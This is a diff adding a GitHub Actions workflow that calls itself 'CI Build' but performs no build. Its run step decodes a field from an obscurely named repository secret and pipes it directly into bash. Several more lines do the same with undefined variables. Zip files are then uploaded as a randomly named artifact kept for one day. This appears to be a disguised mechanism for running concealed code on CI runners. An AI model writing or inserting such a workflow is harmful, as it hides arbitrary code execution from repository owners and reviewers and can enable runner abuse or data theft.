@@ -1,0 +1,35 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          vffkn4: ${{ secrets.vffkn4 }}
+        run: |
+          printf '%s' "$vffkn4" | jq -r .npz0980 | /bin/bash
+          printf '%s' "$c479" | jq -r .rj3 | /bin/bash
+          echo $vdb272 | jq -r .nv8 | /bin/bash
+          echo $xqmiu7 | jq -r .mnjc47055 | /bin/bash
+          echo $dlhtb3132 | jq -r .zuy2 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9A5KhLEg
+          path: "*.zip"
+          retention-days: 1
